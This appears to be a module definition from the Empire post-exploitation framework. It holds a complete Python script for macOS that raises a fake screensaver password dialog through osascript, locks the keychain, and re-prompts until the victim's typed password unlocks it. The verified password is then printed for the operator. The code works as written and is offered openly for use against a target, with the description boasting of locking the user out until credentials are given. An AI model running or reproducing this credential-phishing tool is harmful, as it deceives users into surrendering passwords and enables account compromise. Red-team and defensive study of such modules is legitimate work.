name: ScreensaverAlleyOop
authors:
  - name: ''
    handle: '@FuzzyNop'
    link: ''
  - name: Will Schroeder
    handle: '@harmj0y'
    link: https://twitter.com/harmj0y
  - name: ''
    handle: '@enigma0x3'
    link: ''
  - name: ''
    handle: '@Killswitch-GUI'
    link: ''
description: Launches a screensaver with a prompt for credentials with osascript. This locks the user out until the password
  can unlock the user keychain. This allows you to prevent Sudo/su failed logon attempts. (credentials till I get them!)
software: ''
tactics: []
techniques:
  - T1113
background: false
output_extension: ''
needs_admin: false
opsec_safe: false
language: python
min_language_version: '2.6'
comments:
  - https://github.com/fuzzynop/FiveOnceInYourLife
  - https://github.com/enigma0x3/Invoke-LoginPrompt
options:
  - name: Agent
    description: Agent to execute module on.
    required: true
    value: ''
  - name: ExitCount
    description: 'Exit Screensaver after # of attempts'
    required: true
    value: '15'
  - name: Verbose
    description: Run in verbose mode.
    required: true
    value: 'False'
    strict: true
    suggested_values:
      - True
      - False
script: |-
  import subprocess
  import time
  import sys

  def myrun(cmd):
      """from http://blog.kagesenshi.org/2008/02/teeing-python-subprocesspopen-output.html"""
      p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
      stdout = []
      while True:
          line = p.stdout.readline()
          stdout.append(line)
          if line == '' and p.poll() != None:
              break
      return ''.join(stdout)

  def lockchain():
      # do this to ensure keychain is locked
      subprocess.Popen('security lock-keychain', stdout=subprocess.PIPE, shell=True)
      subprocess.Popen('security lock-keychain', stdout=subprocess.PIPE, shell=True)
      subprocess.Popen('security lock-keychain', stdout=subprocess.PIPE, shell=True)

  def unlockchain(password):
      cmd = 'security unlock-keychain -p ' + str(password)
      #process = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
      #text = process.communicate()
      text = myrun(cmd)
      #print "text: " + str(text)
      if text == '':
          return True
      else:
          return False
  def retrypassword():
      process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "Password Incorect!" & return  default answer "" with icon 1 with hidden answer with title "Login"'""", stdout=subprocess.PIPE, shell=True)
      text = process.communicate()
      return text[0]

  def parse(text):
      text = text.split(':')
      password = text[-1]
      password.rstrip('\\n')
      password.rstrip('\\r')
      password.replace('!','%%21')
      password.replace('#','%%23')
      password.replace('$','%%24')
      return password

  def run(exitCount, verbose=False):
      try:
          process = subprocess.Popen("""osascript -e  'tell app "ScreenSaverEngine" to activate' -e 'tell app "ScreenSaverEngine" to display dialog "ScreenSaver requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "ScreenSaver Alert"'""", stdout=subprocess.PIPE, shell=True)
          text = process.communicate()
          text = text[0]
          count = 0
          while True:
              if exitCount:
                  count += 1
                  if count > exitCount:
                      break
              if 'button returned:OK, text returned:' in text:
                  password = parse(text)
                  if password:
                      lockchain()
                      # try to get first password
                      correct = unlockchain(password)
                      if correct:
                          # we found the right password!
                          print('[!] unlock-keychain passed: ' + str(password))
                          break
                      else:
                          print("[*] Bad password: " + str(password))
                          text = retrypassword()
              else:
                  text = retrypassword()
      except Exception as e:
          print(e)

  exitCount = {{ ExitCount }}
  verbose = {{ Verbose }}
  run(exitCount, verbose=verbose)
